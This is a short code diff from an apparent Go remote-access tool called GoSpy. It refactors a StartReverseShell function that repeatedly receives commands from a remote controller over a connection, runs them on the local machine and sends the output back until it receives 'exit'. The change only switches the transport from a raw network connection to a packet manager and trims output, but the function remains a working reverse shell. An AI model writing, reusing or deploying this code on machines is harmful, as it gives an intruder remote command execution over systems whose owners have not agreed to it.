@@ -2,7 +2,6 @@ package shell
 
 import (
 	"github.com/psidex/GoSpy/internal/comms"
-	"net"
 	"os/exec"
 	"runtime"
 	"strings"
@@ -10,14 +9,14 @@ import (
 
 // StartReverseShell starts a reverse shell from the current machine to address.
 // Will return with err if an error occurs.
-func StartReverseShell(conn net.Conn) (err error) {
+func StartReverseShell(cm comms.PacketManager) (err error) {
 	for {
-		message, err := comms.RecvStringFrom(conn)
+		messageBytes, err := cm.RecvBytes()
 		if err != nil {
 			return err
 		}
 
-		message = strings.TrimSpace(message)
+		message := strings.TrimSpace(string(messageBytes))
 
 		if message == "exit" {
 			return nil
@@ -25,8 +24,9 @@ func StartReverseShell(conn net.Conn) (err error) {
 
 		args := strings.Fields(message)
 		res := execArgs(args)
+		res = strings.TrimSpace(res)
 
-		err = comms.SendStringTo(conn, res)
+		err = cm.SendBytes([]byte(res))
 		if err != nil {
 			return err
 		}
